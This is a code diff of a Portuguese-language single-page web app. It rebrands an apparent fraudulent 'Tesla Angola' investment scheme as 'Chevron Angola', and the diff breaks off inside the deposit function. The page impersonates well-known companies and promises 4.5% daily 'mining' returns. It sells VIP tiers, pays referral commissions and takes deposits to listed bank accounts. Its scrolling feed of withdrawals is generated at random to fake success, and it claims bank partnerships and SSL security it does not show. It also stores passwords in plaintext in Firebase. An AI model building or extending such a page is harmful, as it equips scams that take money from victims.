@@ -1,321 +1,362 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-ao">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Chevron Angola</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
-    <title>TESLA - Oficial</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { background-color: #f8fafc; font-family: 'Inter', sans-serif; margin: 0; overflow-x: hidden; -webkit-font-smoothing: antialiased; }
-        .tesla-orange { color: #FF6B00; }
-        .bg-tesla-orange { background-color: #FF6B00; }
-        .glass-card { background: #ffffff; border: 1px solid rgba(0, 0, 0, 0.05); box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); }
-        .hidden { display: none !important; }
-        .auth-tab-active { border-bottom: 3px solid #FF6B00; color: #1e293b; font-weight: 900; }
-        #notification-container { position: fixed; top: 10px; right: 10px; left: 10px; z-index: 9999; }
-        .notification { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-left: 5px solid #FF6B00; font-size: 11px; font-weight: 800; margin-bottom: 8px; animation: slideIn 0.3s ease-out; }
-        @keyframes slideIn { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        button:active { transform: scale(0.96); transition: 0.1s; }
+        :root { --azul: #0062ff; --fundo: #F8FAFC; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--fundo); margin: 0; overflow: hidden; height: 100vh; font-family: sans-serif; }
+        .card-gh { background: white; border-radius: 20px; border: 1px solid #f1f5f9; }
+        .tela { display: none; height: 100vh; width: 100vw; position: absolute; flex-direction: column; overflow-y: auto; padding-bottom: 100px; }
+        .ativa { display: flex !important; }
+        
+        /* Rodapé Rolante */
+        #rodape-geral { position: fixed; bottom: 70px; width: 100%; background: #000; color: #fff; padding: 5px 0; overflow: hidden; z-index: 999; display: none; }
+        .rodape-texto { display: inline-block; white-space: nowrap; animation: rolar 20s linear infinite; font-size: 10px; font-weight: bold; }
+        @keyframes rolar { 0% { transform: translateX(100%); } 100% { transform: translateX(-150%); } }
+
+        /* Animação de Saques */
+        .janela-saques { background: #0062ff; border-radius: 15px; overflow: hidden; height: 160px; position: relative; margin: 10px 0; }
+        .scroll-saques { position: absolute; width: 100%; animation: subirSaque 25s linear infinite; }
+        @keyframes subirSaque { 0% { top: 100%; } 100% { top: -100%; } }
+
+        nav { height: 70px; background: white; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #eee; z-index: 1000; }
+        .nav-btn { display: flex; flex-direction: column; align-items: center; font-size: 9px; font-weight: bold; color: #94a3b8; border: none; background: none; }
+        .nav-btn.active { color: var(--azul); }
     </style>
 </head>
 <body>
+    <div id="notificacao" class="fixed top-10 left-1/2 -translate-x-1/2 bg-white p-4 rounded-xl shadow-2xl z-[9999] hidden text-center w-4/5 border-l-4 border-blue-600 font-bold uppercase text-xs"></div>
 
-    <div id="notification-container"></div>
-
-    <div id="auth-portal" class="flex items-center justify-center min-h-screen p-6">
-        <div class="w-full max-sm glass-card rounded-[2.5rem] overflow-hidden">
-            <div class="pt-10 pb-4 text-center">
-                <h1 class="text-3xl font-black tesla-orange uppercase italic">Tesla</h1>
-            </div>
-            <div class="flex border-b border-zinc-100 text-center">
-                <button id="tab-login" class="flex-1 py-4 text-zinc-400 font-bold text-[10px] uppercase">Entrar</button>
-                <button id="tab-register" class="flex-1 py-4 auth-tab-active text-[10px] uppercase">Registo</button>
-            </div>
-            <div class="p-6 space-y-3">
-                <input type="tel" id="auth-contact" placeholder="Número Telemóvel" class="w-full p-4 bg-zinc-50 border rounded-xl text-center font-bold">
-                <input type="password" id="auth-pass" placeholder="Senha" class="w-full p-4 bg-zinc-50 border rounded-xl text-center font-bold">
-                <div id="confirm-pass-container">
-                    <input type="password" id="auth-confirm-pass" placeholder="Confirmar Senha" class="w-full p-4 bg-zinc-50 border rounded-xl text-center font-bold">
-                </div>
-                <button id="auth-main-btn" class="w-full bg-tesla-orange text-white font-black py-4 rounded-xl uppercase text-[11px] mt-2 shadow-md">Confirmar</button>
-            </div>
+    <section id="s-login" class="tela ativa items-center justify-center p-8 bg-white">
+        <div class="fixed top-5 right-5">
+            <select class="bg-gray-100 text-[10px] font-bold p-2 rounded-lg border-none outline-none">
+                <option>Português</option>
+                <option>Francês</option>
+                <option>Inglês</option>
+            </select>
         </div>
-    </div>
-
-    <div id="main-app" class="hidden pb-24">
-        <header class="p-6 flex justify-between items-center">
-            <h1 class="text-xl font-black italic uppercase">Tesla Angola</h1>
-            <button onclick="location.reload()" class="w-10 h-10 rounded-xl bg-white border flex items-center justify-center text-red-500 shadow-sm"><i class="fa-solid fa-power-off"></i></button>
-        </header>
-
-        <div id="view-home" class="view-section px-5 space-y-4">
-            <div class="glass-card rounded-[2.5rem] p-8 text-center border-t-4 border-tesla-orange">
-                <p class="text-zinc-400 text-[10px] uppercase font-black">Saldo Disponível</p>
-                <h2 class="text-4xl font-black text-zinc-900"><span id="main-balance">0.00</span> <small class="text-sm tesla-orange italic">Kz</small></h2>
-            </div>
-            <div class="grid grid-cols-2 gap-3">
-                <button id="open-dep" class="bg-tesla-orange text-white py-5 rounded-2xl font-black text-[10px] uppercase italic shadow-md">Depósito</button>
-                <button id="open-wit" class="glass-card py-5 rounded-2xl font-black text-[10px] uppercase italic text-zinc-600 border border-zinc-100 shadow-sm">Saque</button>
-            </div>
+        <h1 class="text-3xl font-black text-blue-600 italic mb-8 uppercase">CHEVRON</h1>
+        <div class="card-gh w-full p-6 space-y-4 shadow-xl">
+            <input type="tel" id="u-tel" placeholder="Telefone" class="w-full p-4 bg-gray-50 rounded-xl outline-none font-bold">
+            <input type="password" id="u-pw" placeholder="Senha" class="w-full p-4 bg-gray-50 rounded-xl outline-none font-bold">
+            <div id="area-reg" class="hidden"><input type="password" id="u-pw2" placeholder="Confirmar Senha" class="w-full p-4 bg-gray-50 rounded-xl font-bold mt-2"></div>
+            <button onclick="fazerLogin()" id="btn-entrar" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold uppercase">Entrar</button>
+            <button onclick="toggleReg()" class="w-full text-[10px] font-bold opacity-40 uppercase">Criar Conta</button>
         </div>
-
-        <div id="view-ganhos" class="view-section px-5 hidden">
-            <div class="glass-card rounded-[2rem] p-6 text-center">
-                <p class="text-[10px] font-black uppercase text-zinc-400">Investimento Ativo</p>
-                <h2 class="text-3xl font-black mb-4"><span id="mining-balance">0.00</span> Kz</h2>
-                <button id="btn-collect-manual" class="w-full bg-emerald-500 text-white py-4 rounded-xl font-black text-[10px] uppercase mb-4 shadow-sm">Receber Lucro Diário (5%)</button>
-                <hr class="mb-4">
-                <input type="number" id="activate-amount" placeholder="Valor a Investir" class="w-full p-4 bg-zinc-50 border rounded-xl mb-3 text-center font-bold">
-                <button id="btn-invest" class="w-full bg-zinc-900 text-white py-4 rounded-xl font-black text-[10px] uppercase shadow-md">Ativar Novo Plano</button>
-            </div>
+        <div class="mt-10 text-center opacity-40 space-y-2">
+            <p class="text-[9px] font-bold uppercase italic"><i class="fas fa-shield-alt"></i> Segurança SSL Criptografada</p>
+            <p class="text-[9px] font-bold uppercase">Parceria Oficial: BFA | BCI | VIA EXPRESS</p>
         </div>
+    </section>
 
-        <div id="view-equipa" class="view-section px-5 hidden">
-            <div class="glass-card rounded-[2rem] p-6 text-center">
-                <p class="text-[10px] font-black uppercase text-zinc-400 mb-4">Seu Link de Convite</p>
-                <input type="text" id="invite-link" readonly class="w-full p-4 bg-zinc-50 rounded-xl text-[10px] font-bold text-center mb-4 border">
-                <button id="btn-copy" class="w-full bg-zinc-900 text-white py-4 rounded-xl font-black text-[10px] uppercase shadow-md">Copiar Link</button>
-            </div>
-        </div>
-
-        <div id="view-extrato" class="view-section px-5 hidden">
-            <h3 class="font-black uppercase text-sm mb-4 italic">Histórico de Transações</h3>
-            <div id="transaction-list" class="space-y-2"></div>
-        </div>
-
-        <nav class="fixed bottom-0 left-0 right-0 bg-zinc-900 p-4 flex justify-around items-center z-50 rounded-t-[2rem] shadow-2xl">
-            <button id="nav-home" class="flex flex-col items-center text-zinc-500"><i class="fa-solid fa-house"></i><span class="text-[8px] font-bold mt-1">HOME</span></button>
-            <button id="nav-ganhos" class="flex flex-col items-center text-zinc-500"><i class="fa-solid fa-bolt"></i><span class="text-[8px] font-bold mt-1">PLANOS</span></button>
-            <button id="nav-equipa" class="flex flex-col items-center text-zinc-500"><i class="fa-solid fa-users"></i><span class="text-[8px] font-bold mt-1">EQUIPA</span></button>
-            <button id="nav-extrato" class="flex flex-col items-center text-zinc-500"><i class="fa-solid fa-receipt"></i><span class="text-[8px] font-bold mt-1">EXTRATO</span></button>
+    <section id="s-app" class="tela">
+        <div id="conteudo" class="p-4"></div>
+        <div id="rodape-geral"><div class="rodape-texto">MINERAÇÃO 4.5% AO DIA • DEPÓSITO MÍNIMO 100 KZ • SAQUE MÍNIMO 300 KZ • TAXA DE SAQUE 10% • BFA: 0006 0000 5460 3875 3011 7 • BCI: 0005 0000 6987 5212 1019 7</div></div>
+        <nav>
+            <button onclick="ir('home')" id="n-home" class="nav-btn active"><i class="fas fa-home text-xl"></i>HOME</button>
+            <button onclick="ir('mine')" id="n-mine" class="nav-btn"><i class="fas fa-microchip text-xl"></i>INVESTIR</button>
+            <button onclick="ir('vip')" id="n-vip" class="nav-btn"><i class="fas fa-crown text-xl"></i>VIPS</button>
+            <button onclick="ir('team')" id="n-team" class="nav-btn"><i class="fas fa-users text-xl"></i>EQUIPA</button>
+            <button onclick="ir('perfil')" id="n-perfil" class="nav-btn"><i class="fas fa-user-circle text-xl"></i>PERFIL</button>
         </nav>
-    </div>
-
-    <div id="modal-container" class="fixed inset-0 bg-black/80 z-[100] hidden flex items-center justify-center p-6 backdrop-blur-sm">
-        <div class="w-full max-w-sm bg-white rounded-[2rem] p-8 text-center shadow-2xl" id="modal-content"></div>
-    </div>
-
-    <script type="module">
+                </section>
+                    <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, set, get, update, onValue, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        import { getFirestore, doc, getDoc, setDoc, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const firebaseConfig = {
-            apiKey: "AIzaSyC3SurEz7aLcHG4yBUq5zrGBPOb2mvLpZ4",
-            authDomain: "fir-6e9ec.firebaseapp.com",
-            databaseURL: "https://fir-6e9ec-default-rtdb.firebaseio.com",
-            projectId: "fir-6e9ec",
-            storageBucket: "fir-6e9ec.firebasestorage.app",
-            messagingSenderId: "579697818964",
-            appId: "1:579697818964:web:aad151fcbe3989df431cc1"
+            apiKey: "AIzaSyA03WW6zrf79PsZY6KvaxGRsGFY1AEFCYs",
+            authDomain: "fir-b8708.firebaseapp.com",
+            projectId: "fir-b8708",
+            storageBucket: "fir-b8708.firebasestorage.app",
+            messagingSenderId: "174524990208",
+            appId: "1:174524990208:web:eb08738fdd7cd1cd98a9e5"
         };
 
         const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        let userLogged = "";
-        let authMode = "register";
-        let tempProof = "";
+        const db = getFirestore(app);
+        let userID = null, emReg = false;
 
-        const notify = (m, type="success") => {
-            const container = document.getElementById("notification-container");
-            const div = document.createElement("div");
-            div.className = "notification shadow-lg";
-            if(type === "error") div.style.borderLeftColor = "red";
-            div.innerText = m;
-            container.appendChild(div);
-            setTimeout(() => div.remove(), 3000);
+        const avisar = (msg) => {
+            const b = document.getElementById('notificacao');
+            b.innerText = msg; b.classList.remove('hidden');
+            setTimeout(() => b.classList.add('hidden'), 3000);
         };
 
-        // LOGIN E REGISTO
-        document.getElementById("auth-main-btn").onclick = async () => {
-            const phone = document.getElementById("auth-contact").value.trim();
-            const pass = document.getElementById("auth-pass").value.trim();
-            if(!phone || !pass) return notify("Campos vazios!", "error");
-
-            const uRef = ref(db, "users/" + phone);
-            try {
-                const snap = await get(uRef);
-                if(authMode === "register") {
-                    if(snap.exists()) return notify("Número já em uso!", "error");
-                    const refParam = new URLSearchParams(window.location.search).get('ref') || "direto";
-                    await set(uRef, { phone, pass, balance: 500, mining: 0, lastCollect: "", invitedBy: refParam });
-                    notify("Registo concluído!"); document.getElementById("tab-login").click();
-                } else {
-                    if(snap.exists() && snap.val().pass === pass) {
-                        userLogged = phone;
-                        document.getElementById("auth-portal").classList.add("hidden");
-                        document.getElementById("main-app").classList.remove("hidden");
-                        document.getElementById("invite-link").value = window.location.origin + window.location.pathname + "?ref=" + phone;
-                        onValue(uRef, s => {
-                            if(s.exists()){
-                                document.getElementById("main-balance").innerText = s.val().balance.toFixed(2);
-                                document.getElementById("mining-balance").innerText = (s.val().mining || 0).toFixed(2);
-                            }
-                        });
-                        loadHistory();
-                        document.getElementById("nav-home").click();
-                    } else notify("Número ou Senha errados!", "error");
-                }
-            } catch(e) { notify("Erro de conexão", "error"); }
+        window.toggleReg = () => {
+            emReg = !emReg;
+            document.getElementById('area-reg').classList.toggle('hidden', !emReg);
+            document.getElementById('btn-entrar').innerText = emReg ? "CADASTRAR" : "ENTRAR";
         };
 
-        // HISTÓRICO
-        function loadHistory() {
-            onValue(ref(db, "transactions"), snap => {
-                const box = document.getElementById("transaction-list");
-                box.innerHTML = "";
-                if(snap.exists()){
-                    const txs = Object.values(snap.val()).filter(t => t.user === userLogged).reverse();
-                    txs.slice(0, 20).forEach(t => {
-                        let cor = t.status === "CONCLUÍDO" || t.status === "APROVADO" ? "text-emerald-500" : "text-orange-500";
-                        box.innerHTML += `<div class="glass-card p-4 rounded-xl flex justify-between items-center text-[10px] border-l-4 border-zinc-100">
-                            <div><b class="uppercase">${t.tipo}</b><br><span class="opacity-40">${t.data}</span></div>
-                            <div class="text-right"><b>${t.valor.toFixed(2)} Kz</b><br><span class="${cor} font-black">${t.status}</span></div>
-                        </div>`;
-                    });
-                }
-            });
-        }
-
-        // DEPOSITO
-        document.getElementById("open-dep").onclick = () => {
-            tempProof = "";
-            const modal = document.getElementById("modal-container");
-            modal.classList.remove("hidden");
-            document.getElementById("modal-content").innerHTML = `
-                <h3 class="font-black mb-3 tesla-orange uppercase italic">Depósito</h3>
-                <div class="bg-zinc-50 p-3 rounded-lg text-left text-[9px] mb-4 border border-zinc-100">
-                    <p>BFA: <b>0006 0000 2870 9134 3015 1</b></p>
-                    <p class="mt-1">BAI: <b>0040 0000 0927 0667 1014 1</b></p>
-                </div>
-                <input type="number" id="val-dep" placeholder="Valor Kz" class="w-full p-4 bg-zinc-50 border rounded-xl mb-3 text-center font-bold">
-                <input type="file" id="input-file" accept="image/*" class="text-[10px] mb-4 w-full">
-                <button id="final-dep" class="w-full bg-tesla-orange text-white py-4 rounded-xl font-black uppercase shadow-md">Confirmar Envio</button>
-                <button onclick="document.getElementById('modal-container').classList.add('hidden')" class="mt-3 text-[10px] opacity-40 font-bold uppercase">Fechar</button>
-            `;
-            document.getElementById("input-file").onchange = (e) => {
-                const reader = new FileReader();
-                reader.onload = (ev) => { tempProof = ev.target.result; notify("Foto carregada!"); };
-                reader.readAsDataURL(e.target.files[0]);
-            };
-            document.getElementById("final-dep").onclick = async () => {
-                const v = document.getElementById("val-dep").value;
-                if(!v || !tempProof) return notify("Falta valor ou foto", "error");
-                await push(ref(db, "transactions"), { user: userLogged, valor: parseFloat(v), tipo: "DEPÓSITO", status: "PENDENTE", comprovante: tempProof, data: new Date().toLocaleString() });
-                modal.classList.add("hidden"); notify("Enviado para análise");
-            };
-        };
-
-        // SAQUE (CORRIGIDO PARA ENVIAR IBAN)
-        document.getElementById("open-wit").onclick = () => {
-            const modal = document.getElementById("modal-container");
-            modal.classList.remove("hidden");
-            document.getElementById("modal-content").innerHTML = `
-                <h3 class="font-black mb-3 uppercase italic text-zinc-800">Sacar Saldo</h3>
-                <input type="text" id="iban-wit" placeholder="Seu IBAN" class="w-full p-4 bg-zinc-50 border rounded-xl mb-3 text-center font-bold">
-                <input type="number" id="val-wit" placeholder="Valor em Kz" class="w-full p-4 bg-zinc-50 border rounded-xl mb-4 text-center font-bold">
-                <button id="final-wit" class="w-full bg-zinc-900 text-white py-4 rounded-xl font-black uppercase shadow-md">Solicitar Saque</button>
-                <button onclick="document.getElementById('modal-container').classList.add('hidden')" class="mt-3 text-[10px] opacity-40 font-bold uppercase">Cancelar</button>
-            `;
-            document.getElementById("final-wit").onclick = async () => {
-                const v = parseFloat(document.getElementById("val-wit").value);
-                const iban = document.getElementById("iban-wit").value.trim(); // CAPTURA O IBAN
-                
-                if(!iban || iban.length < 5) return notify("Insira um IBAN válido!", "error");
-                if(!v || v < 200) return notify("Saque mínimo: 200 Kz", "error");
-                
-                const snap = await get(ref(db, "users/" + userLogged));
-                const d = snap.val();
-                if(d.balance < v) return notify("Saldo insuficiente", "error");
-
-                // Deduz saldo e envia transação com IBAN
-                await update(ref(db, "users/" + userLogged), { balance: d.balance - v });
-                await push(ref(db, "transactions"), { 
-                    user: userLogged, 
-                    valor: v, 
-                    iban: iban, // AQUI ENVIA O IBAN PARA O ADMIN
-                    tipo: "SAQUE", 
-                    status: "PENDENTE", 
-                    data: new Date().toLocaleString() 
+        window.fazerLogin = async () => {
+            const t = document.getElementById('u-tel').value, p = document.getElementById('u-pw').value;
+            if(!t || !p) return avisar("PREENCHA OS CAMPOS");
+            const ref = doc(db, "usuarios", t);
+            if(emReg) {
+                await setDoc(ref, { 
+                    pw: p, saldo: 0, r_ontem: 0, r_hoje: 0, r_total: 0, investido: 0, convidados: 0,
+                    iban: "", banco: "", titular: "", extrato: [], checkin: "", vip: 0
                 });
-                
-                modal.classList.add("hidden"); 
-                notify("Pedido de saque enviado");
+                avisar("CONTA CRIADA!"); window.toggleReg();
+            } else {
+                const s = await getDoc(ref);
+                if(s.exists() && s.data().pw === p) {
+                    userID = t;
+                    document.getElementById('s-login').classList.remove('ativa');
+                    document.getElementById('s-app').classList.add('ativa');
+                    ir('home');
+                } else avisar("DADOS INCORRETOS");
+            }
+        };
+
+        window.ir = async (pg) => {
+            const view = document.getElementById('conteudo');
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('n-'+pg)?.classList.add('active');
+            
+            // Controle de visibilidade do Rodapé
+            document.getElementById('rodape-geral').style.display = (pg === 'home') ? 'block' : 'none';
+
+            const snap = await getDoc(doc(db, "usuarios", userID));
+            const u = snap.data();
+
+            if(pg === 'home') {
+                const saquesHTML = Array.from({length: 25}, () => `<div class="p-3 border-b border-white/10 flex justify-between text-[10px] text-white font-bold italic"><span>943***${Math.floor(Math.random()*999)}</span><span>SACADO: ${(Math.random()*15000+300).toFixed(0)} KZ</span></div>`).join('');
+                view.innerHTML = `
+                    <p class="text-[10px] font-bold opacity-30 uppercase italic mb-2 text-right">ID: ${userID}</p>
+                    <div class="card-gh p-6 bg-zinc-900 text-white mb-4">
+                        <p class="text-[9px] opacity-40 font-bold uppercase">Saldo de Mineração</p>
+                        <h2 class="text-4xl font-black italic mb-6">${(u.saldo || 0).toFixed(2)} KZ</h2>
+                        <div class="grid grid-cols-3 gap-2">
+                            <button onclick="ir('dep')" class="bg-blue-600 p-3 rounded-xl text-[9px] font-bold">DEPÓSITO</button>
+                            <button onclick="avisar('FUNDO PARA BREVE')" class="bg-zinc-700 p-3 rounded-xl text-[9px] font-bold">FUNDO</button>
+                            <button onclick="ir('saq')" class="bg-white/10 p-3 rounded-xl text-[9px] font-bold">SAQUE</button>
+                        </div>
+                    </div>
+                    <div class="janela-saques"><div class="scroll-saques">${saquesHTML}</div></div>
+                `;
+            }
+
+            if(pg === 'mine') {
+                view.innerHTML = `
+                    <div class="card-gh p-8 text-center border-t-4 border-blue-600">
+                        <p class="text-[10px] font-bold opacity-40 mb-2 uppercase">Investimento em Mineração (4.5%/Dia)</p>
+                        <h3 class="text-2xl font-black mb-8 italic uppercase">${(u.investido || 0).toFixed(2)} KZ</h3>
+                        <input type="number" id="val-in" placeholder="Mínimo 100 KZ" class="w-full p-4 bg-gray-50 rounded-xl mb-4 font-bold outline-none border-2">
+                        <button onclick="investir()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold uppercase">Ativar Máquina</button>
+                        <button onclick="receberComissao()" class="w-full mt-4 text-[10px] font-bold text-blue-600 uppercase italic">Receber Comissão</button>
+                    </div>`;
+            }
+
+            if(pg === 'vip') {
+                const vips = [
+                    {p: 15000, n: "VIP 1"}, {p: 45000, n: "VIP 2"}, {p: 90000, n: "VIP 3"},
+                    {p: 180000, n: "VIP 4"}, {p: 360000, n: "VIP 5"}, {p: 720000, n: "VIP 6"}
+                ];
+                view.innerHTML = `
+                    <div class="flex justify-between items-center mb-6"><h2 class="font-black italic uppercase">Níveis VIP</h2><button onclick="checkin()" class="bg-blue-600 text-white px-4 py-2 rounded-lg text-[10px] font-bold uppercase">Check-in +4KZ</button></div>
+                    ${vips.map((v, i) => `
+                    <div class="card-gh p-5 flex justify-between items-center mb-3 border-l-4 border-blue-600">
+                        <div><b class="text-[11px] uppercase">${v.n} • ${v.p} KZ</b><br><small class="text-blue-600 font-bold italic">Renda: ${(v.p * 0.045).toFixed(2)} KZ/Dia</small></div>
+                        <button onclick="upVIP(${v.p}, ${i+1})" class="bg-blue-600 text-white px-4 py-2 rounded-lg text-[9px] font-bold">ATIVAR</button>
+                    </div>`).join('')}`;
+            }
+
+            if(pg === 'team') {
+                view.innerHTML = `
+                    <div class="card-gh p-6 mb-4 text-center"><p class="text-[9px] opacity-40 font-bold uppercase">Total de Convidados</p><b class="text-3xl font-black">${u.convidados || 0}</b></div>
+                    <div class="card-gh p-6 space-y-4">
+                        <p class="text-[10px] font-bold opacity-40 uppercase">Seu Link de Convite:</p>
+                        <input id="link-c" value="${window.location.origin}/?ref=${userID}" class="w-full p-3 bg-gray-100 rounded-lg text-[10px] font-bold outline-none" readonly>
+                        <button onclick="copiarLink()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold uppercase text-[10px]">Copiar Link</button>
+                        <div class="p-4 bg-blue-50 rounded-xl text-[10px] font-bold text-blue-800 leading-relaxed italic border-l-4 border-blue-600">
+                            GANHE 10% AUTOMATICAMENTE: Ao convidar pessoas, você ganha 10% do valor que elas investirem na mineração e VIPs (para investimentos superiores a 1.000 KZ).
+                        </div>
+                    </div>`;
+            }
+
+            if(pg === 'perfil') {
+                view.innerHTML = `
+                    <div class="grid grid-cols-3 gap-2 mb-4 text-center font-bold uppercase italic">
+                        <div class="card-gh p-3"><p class="text-[8px] opacity-40">ONTEM</p><b class="text-[10px]">${(u.r_ontem || 0).toFixed(2)}</b></div>
+                        <div class="card-gh p-3 border-b-4 border-blue-600"><p class="text-[8px] opacity-40">HOJE</p><b class="text-[10px] text-blue-600">${(u.r_hoje || 0).toFixed(2)}</b></div>
+                        <div class="card-gh p-3"><p class="text-[8px] opacity-40">TOTAL</p><b class="text-[10px]">${(u.r_total || 0).toFixed(2)}</b></div>
+                    </div>
+                    <div class="space-y-2">
+                        <button onclick="ir('add-bank')" class="w-full card-gh p-5 flex justify-between font-bold text-[10px] uppercase">Adicionar Conta para Saque</button>
+                        <button onclick="ir('extrato')" class="w-full card-gh p-5 flex justify-between font-bold text-[10px] uppercase text-blue-600 italic">Extrato de Transações</button>
+                        <button onclick="ir('sobre')" class="w-full card-gh p-5 flex justify-between font-bold text-[10px] uppercase">Sobre a Empresa</button>
+                        <a href="https://chat.whatsapp.com/Ji5xHNtU5gf0QNUp8HjMVe" class="w-full card-gh p-5 flex justify-between font-bold text-[10px] uppercase text-green-600">Atendimento WhatsApp <i class="fab fa-whatsapp"></i></a>
+                        <button onclick="avisar('DOWNLOAD EM BREVE')" class="w-full card-gh p-5 flex justify-between font-bold text-[10px] uppercase text-zinc-300 italic">Baixar APP</button>
+                    </div>`;
+            }
+
+            if(pg === 'dep') {
+                view.innerHTML = `
+                    <div class="card-gh p-5 mb-4 text-[9px] font-bold uppercase bg-zinc-900 text-blue-400 text-center leading-relaxed">
+                        BFA: 0006 0000 5460 3875 3011 7 <br> BCI: 0005 0000 6987 5212 1019 7 <br> VIA EXPRESS: 921054122
+                    </div>
+                    <div class="card-gh p-6 space-y-4">
+                        <input type="number" id="v-dep" placeholder="Valor do Depósito" class="w-full p-4 bg-gray-50 rounded-xl font-bold border-2">
+                        <div class="border-2 border-dashed p-6 rounded-xl text-center relative bg-gray-50">
+                            <label id="lbl-file" class="text-[10px] font-bold text-gray-400 uppercase italic">selecionar comprovante</label>
+                            <input type="file" accept="image/*" class="absolute inset-0 opacity-0" onchange="previewImg(this)">
+                            <img id="p-img" class="mt-4 mx-auto hidden max-h-40 rounded-lg shadow-lg border-2 border-white">
+                        </div>
+                        <button id="btn-env-dep" onclick="enviarDep()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold uppercase">Enviar Comprovante</button>
+                    </div>`;
+            }
+
+            if(pg === 'add-bank') {
+                view.innerHTML = `
+                    <div class="card-gh p-6 space-y-4">
+                        <select id="b-sel" class="w-full p-4 bg-gray-100 rounded-xl font-bold"><option>BFA</option><option>BCI</option><option>VIA EXPRESS</option></select>
+                        <input type="text" id="b-tit" placeholder="Nome Completo" value="${u.titular||''}" class="w-full p-4 bg-gray-50 rounded-xl font-bold">
+                        <input type="number" id="b-iban" placeholder="IBAN (21 Dígitos)" value="${u.iban||''}" class="w-full p-4 bg-gray-50 rounded-xl font-bold">
+                        <button onclick="salvarBanco()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold uppercase">Salvar Conta</button>
+                    </div>`;
+            }
+
+            if(pg === 'saq') {
+                view.innerHTML = `
+                    <div class="card-gh p-6 space-y-5">
+                        <div class="p-4 bg-blue-50 rounded-xl border-l-4 border-blue-600"><p class="text-[8px] opacity-50 font-bold">IBAN VINCULADO:</p><b class="text-[11px] italic font-black">${u.iban ? (u.banco + ' | ' + u.iban) : 'CONTA NÃO VINCULADA'}</b></div>
+                        <input type="number" id="v-saq" oninput="calcSaq(this.value)" placeholder="Mínimo 300 KZ" class="w-full p-6 bg-gray-50 rounded-3xl text-3xl font-black text-center outline-none border-2">
+                        <div class="flex justify-between font-bold text-[10px] px-2 uppercase italic"><span>Dedução (10%):</span><span id="v-liq" class="text-red-600">0.00 KZ</span></div>
+                        <button onclick="solicitarSaque()" class="w-full bg-blue-600 text-white py-5 rounded-2xl font-bold uppercase">Levantar Dinheiro</button>
+                    </div>`;
+            }
+
+            if(pg === 'extrato') {
+                view.innerHTML = `<h2 class="font-black italic mb-4 uppercase">Extrato Detalhado</h2><div class="card-gh">
+                    ${(u.extrato || []).length > 0 ? u.extrato.map(l => `
+                    <div class="p-4 border-b flex justify-between text-[10px] font-bold uppercase">
+                        <div><span class="opacity-40">${l.data}</span><br><span>${l.desc}</span></div>
+                        <span class="${l.tipo === 'saq' ? 'text-red-500' : 'text-green-600'} font-black text-right">${l.valor} KZ<br><small class="opacity-40 text-[7px]">${l.status}</small></span>
+                    </div>`).reverse().join('') : '<p class="p-10 text-center opacity-30 font-bold uppercase">Sem registros</p>'}</div>`;
+            }
+
+            if(pg === 'sobre') {
+                view.innerHTML = `<div class="card-gh p-6 text-[10px] font-bold italic leading-relaxed uppercase text-gray-500">
+                    <h2 class="text-blue-600 font-black mb-4">SOBRE A CHEVRON ANGOLA</h2>
+                    <p><b>Objectivos:</b> Democratizar a mineração digital em Angola com baixo custo operacional.</p><br>
+                    <p><b>Área de Atuação:</b> Gestão de hardware de alto desempenho e cloud computing.</p><br>
+                    <p><b>Regras:</b> Saques permitidos a partir de 300 KZ. Pagamentos via transferência bancária em até 24h úteis.</p>
+                </div>`;
+            }
+        };
+
+        // FUNÇÕES DE DEPÓSITO COM COMPRESSÃO (Resolvendo o erro de envio)
+        window.previewImg = (input) => {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const img = new Image();
+                img.src = e.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = 400; // Redimensiona para ser leve
+                    canvas.height = img.height * (400 / img.width);
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    document.getElementById('p-img').src = canvas.toDataURL('image/jpeg', 0.6); // 60% qualidade
+                    document.getElementById('p-img').classList.remove('hidden');
+                    document.getElementById('lbl-file').innerText = "VOUCHER CARREGADO!";
+                };
             };
+            reader.readAsDataURL(input.files[0]);
         };
 
-        // RECOLHER RENDA
-        document.getElementById("btn-collect-manual").onclick = async () => {
-            const snap = await get(ref(db, "users/" + userLogged));
-            const d = snap.val();
-            const today = new Date().toLocaleDateString();
-            
-            if(d.lastCollect === today) return notify("Você já recebeu hoje!", "error");
-            if(!d.mining || d.mining <= 0) return notify("Ative um plano primeiro", "error");
-            
-            const lucro = d.mining * 0.05;
-            await update(ref(db, "users/" + userLogged), { balance: d.balance + lucro, lastCollect: today });
-            await push(ref(db, "transactions"), { 
-                user: userLogged, valor: lucro, tipo: "RENDA DIÁRIA", status: "CONCLUÍDO", data: new Date().toLocaleString() 
+        window.enviarDep = async () => {
+            const v = document.getElementById('v-dep').value, img = document.getElementById('p-img').src;
+            if(!v || !img || v < 100) return avisar("DADOS INVÁLIDOS");
+            await updateDoc(doc(db, "usuarios", userID), { 
